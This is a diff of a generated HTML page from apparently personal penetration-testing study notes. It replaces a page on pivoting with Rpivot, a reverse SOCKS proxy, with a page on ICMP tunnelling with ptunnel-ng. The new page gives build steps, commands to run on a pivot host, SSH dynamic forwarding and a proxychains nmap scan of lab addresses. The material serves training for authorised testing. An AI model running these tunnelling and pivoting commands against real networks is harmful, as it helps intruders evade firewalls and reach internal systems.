@@ -6,7 +6,7 @@
   <meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1" />
 
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Web Server Pivoting with Rpivot &mdash; CelestialTech-Notes R1 documentation</title>
+  <title>ICMP Tunneling with SOCKS &mdash; CelestialTech-Notes R1 documentation</title>
       <link rel="stylesheet" type="text/css" href="../../_static/pygments.css?v=8f9ffe49" />
       <link rel="stylesheet" type="text/css" href="../../_static/css/theme.css?v=e59714d7" />
       <link rel="stylesheet" type="text/css" href="../../_static/dark_mode_css/general.css?v=c0a7eb24" />
@@ -23,8 +23,8 @@
     <script src="../../_static/js/theme.js"></script>
     <link rel="index" title="Index" href="../../genindex.html" />
     <link rel="search" title="Search" href="../../search.html" />
-    <link rel="next" title="Port Forwarding with Windows Netsh" href="Port%20Forwarding%20with%20Windows%20Netsh.html" />
-    <link rel="prev" title="SSH Pivoting with Sshuttle" href="SSH%20Pivoting%20with%20Sshuttle.html" /> 
+    <link rel="next" title="Active Directory" href="../../tags/Active%20Directory.html" />
+    <link rel="prev" title="SOCKS5 Tunneling with Chisel" href="SOCKS5%20Tunneling%20with%20Chisel.html" /> 
 </head>
 
 <body class="wy-body-for-nav"> 
@@ -71,18 +71,16 @@
 <li class="toctree-l1"><a class="reference internal" href="Socat%20Redirection%20with%20a%20Bind%20Shell.html">Socat Redirection with a Bind Shell</a></li>
 <li class="toctree-l1"><a class="reference internal" href="SSH%20for%20Windows%3A%20plink.exe.html">SSH for Windows: plink.exe</a></li>
 <li class="toctree-l1"><a class="reference internal" href="SSH%20Pivoting%20with%20Sshuttle.html">SSH Pivoting with Sshuttle</a></li>
-<li class="toctree-l1 current"><a class="current reference internal" href="#">Web Server Pivoting with Rpivot</a><ul>
-<li class="toctree-l2"><a class="reference internal" href="#description">Description</a></li>
-<li class="toctree-l2"><a class="reference internal" href="#installation">Installation</a></li>
-<li class="toctree-l2"><a class="reference internal" href="#usage">Usage</a></li>
-<li class="toctree-l2"><a class="reference internal" href="#ntlm-proxy">NTLM Proxy</a></li>
-<li class="toctree-l2"><a class="reference internal" href="#references">References</a></li>
-</ul>
-</li>
+<li class="toctree-l1"><a class="reference internal" href="Web%20Server%20Pivoting%20with%20Rpivot.html">Web Server Pivoting with Rpivot</a></li>
 <li class="toctree-l1"><a class="reference internal" href="Port%20Forwarding%20with%20Windows%20Netsh.html">Port Forwarding with Windows Netsh</a></li>
 <li class="toctree-l1"><a class="reference internal" href="DNS%20Tunneling%20with%20Dnscat2.html">DNS Tunneling with Dnscat2</a></li>
 <li class="toctree-l1"><a class="reference internal" href="SOCKS5%20Tunneling%20with%20Chisel.html">SOCKS5 Tunneling with Chisel</a></li>
-<li class="toctree-l1"><a class="reference internal" href="ICMP%20Tunneling%20with%20SOCKS.html">ICMP Tunneling with SOCKS</a></li>
+<li class="toctree-l1 current"><a class="current reference internal" href="#">ICMP Tunneling with SOCKS</a><ul>
+<li class="toctree-l2"><a class="reference internal" href="#description">Description</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#installation">Installation</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#attack-example">Attack example</a></li>
+</ul>
+</li>
 </ul>
 <p class="caption" role="heading"><span class="caption-text">Tools</span></p>
 <ul>
@@ -144,9 +142,9 @@
           <div role="navigation" aria-label="Page navigation">
   <ul class="wy-breadcrumbs">
       <li><a href="../../index.html" class="icon icon-home" aria-label="Home"></a></li>
-      <li class="breadcrumb-item active">Web Server Pivoting with Rpivot</li>
+      <li class="breadcrumb-item active">ICMP Tunneling with SOCKS</li>
       <li class="wy-breadcrumbs-aside">
-            <a href="../../_sources/CPTS/Initial Access/Web Server Pivoting with Rpivot.rst.txt" rel="nofollow"> View page source</a>
+            <a href="../../_sources/CPTS/Initial Access/ICMP Tunneling with SOCKS.rst.txt" rel="nofollow"> View page source</a>
       </li>
   </ul>
   <hr/>
@@ -154,54 +152,53 @@
           <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
            <div itemprop="articleBody">
              
-  <section id="web-server-pivoting-with-rpivot">
-<h1>Web Server Pivoting with Rpivot<a class="headerlink" href="#web-server-pivoting-with-rpivot" title="Link to this heading"></a></h1>
-<p>Date:</p>
-<p>Status:</p>
-<p>Tags: #pivoting around obstacles</p>
+  <section id="icmp-tunneling-with-socks">
+<h1>ICMP Tunneling with SOCKS<a class="headerlink" href="#icmp-tunneling-with-socks" title="Link to this heading"></a></h1>
 <section id="description">
 <h2>Description<a class="headerlink" href="#description" title="Link to this heading"></a></h2>
-<p>Rpivot is a reverse SOCKS proxy for tunneling.  rpivot binds a machine inside a network to an external server adn exposes
-the client local port on the server side.</p>
+<p>By leveraging ICMP requests and responses we can encapsulate our traffic in this data.  This is an
+important tool for sites with very restrictive firewalls.</p>
+<p>In this example we will be using a tool called ptunnel-ng</p>
 </section>
 <section id="installation">
 <h2>Installation<a class="headerlink" href="#installation" title="Link to this heading"></a></h2>
-<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">git clone https://github.com/klsecservices/rpivot.git</span>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">git clone https://github.com/utoni/ptunnel-ng.git</span>
+<span class="go">cd  ptunnel-ng</span>
+<span class="go">sudo ./autogen.sh</span>
 </pre></div>
 </div>
-<p>Use pyenv to switch to Python 2.7</p>
-</section>
-<section id="usage">
-<h2>Usage<a class="headerlink" href="#usage" title="Link to this heading"></a></h2>
-<p>Example:  Setting up the connection</p>
-<p>Step 1: Run Rpivot server from the attack host</p>
-<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0</span>
-</pre></div>
-</div>
-<p>Step 2: Transfer rpivot to the client</p>
-<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">scp -r rpivot ubuntu@&lt;IpaddressOfTarget&gt;:/home/ubuntu/</span>
-</pre></div>
-</div>
-<p>Step 3: Run the client from the pivot target</p>
-<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">python2.7 client.py --server-ip 10.10.14.18 --server-port 9999</span>
-</pre></div>
-</div>
-<p>Now by using proxychains we can browse the internal network.</p>
-<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">proxychains firefox-esr 172.16.5.135:80</span>
+<p><strong>Alternative approach and building a static binary</strong></p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">Temen@htb[/htb]$ </span>sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>automake<span class="w"> </span>autoconf<span class="w"> </span>-y
+<span class="gp">Temen@htb[/htb]$ </span><span class="nb">cd</span><span class="w"> </span>ptunnel-ng/
+<span class="gp">Temen@htb[/htb]$ </span>sed<span class="w"> </span>-i<span class="w"> </span><span class="s1">&#39;$s/.*/LDFLAGS=-static &quot;${NEW_WD}\/configure&quot; --enable-static $@ \&amp;\&amp; make clean \&amp;\&amp; make -j${BUILDJOBS:-4} all/&#39;</span><span class="w"> </span>autogen.sh
+<span class="gp">Temen@htb[/htb]$ </span>sudo<span class="w"> </span>./autogen.sh
 </pre></div>
 </div>
 </section>
-<section id="ntlm-proxy">
-<h2>NTLM Proxy<a class="headerlink" href="#ntlm-proxy" title="Link to this heading"></a></h2>
-<p>Some cases where a proxy is enabled, you may have to use creds to connect.</p>
-<p>Example:  Adding creds to the client</p>
-<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">python client.py --server-ip &lt;IPaddressofTargetWebServer&gt; --server-port 8080 --ntlm-proxy-ip &lt;IPaddressofProxy&gt; --ntlm-proxy-port 8081 --domain &lt;nameofWindowsDomain&gt; --username &lt;username&gt; --password &lt;password&gt;</span>
+<section id="attack-example">
+<h2>Attack example<a class="headerlink" href="#attack-example" title="Link to this heading"></a></h2>
+<p>Step 1: Transfer the binary to the pivot host</p>
+<p>Step 2: Start the service on the pivot host</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">#</span><span class="c1"># The ip address is the local address where the client will be connecting</span>
+<span class="go">sudo ./ptunnel-ng -r10.129.202.64 -R22</span>
 </pre></div>
 </div>
-</section>
-<section id="references">
-<h2>References<a class="headerlink" href="#references" title="Link to this heading"></a></h2>
-<p><a class="reference external" href="https://academy.hackthebox.com/module/158/section/1434">https://academy.hackthebox.com/module/158/section/1434</a></p>
+<p>Step 3:  Start the client on the attack host</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22</span>
+</pre></div>
+</div>
+<p>Step 4:  Connect via port 2222 with SSH</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">ssh -p2222 -lubuntu 127.0.0.1</span>
+</pre></div>
+</div>
+<p><strong>Alternate</strong> Connecting with port forwarding with</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">ssh -D 9050 -p2222 -lubuntu 127.0.0.1</span>
+</pre></div>
+</div>
+<p>Now we can use proxychains to run other programs</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">proxychains nmap -sV -sT 172.16.5.19 -p3389</span>
+</pre></div>
+</div>
 </section>
 </section>
 
@@ -209,8 +206,8 @@ the client local port on the server side.</p>
            </div>
           </div>
           <footer><div class="rst-footer-buttons" role="navigation" aria-label="Footer">
-        <a href="SSH%20Pivoting%20with%20Sshuttle.html" class="btn btn-neutral float-left" title="SSH Pivoting with Sshuttle" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous</a>
-        <a href="Port%20Forwarding%20with%20Windows%20Netsh.html" class="btn btn-neutral float-right" title="Port Forwarding with Windows Netsh" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right" aria-hidden="true"></span></a>
+        <a href="SOCKS5%20Tunneling%20with%20Chisel.html" class="btn btn-neutral float-left" title="SOCKS5 Tunneling with Chisel" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous</a>
+        <a href="../../tags/Active%20Directory.html" class="btn btn-neutral float-right" title="Active Directory" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right" aria-hidden="true"></span></a>
     </div>
 
   <hr/>
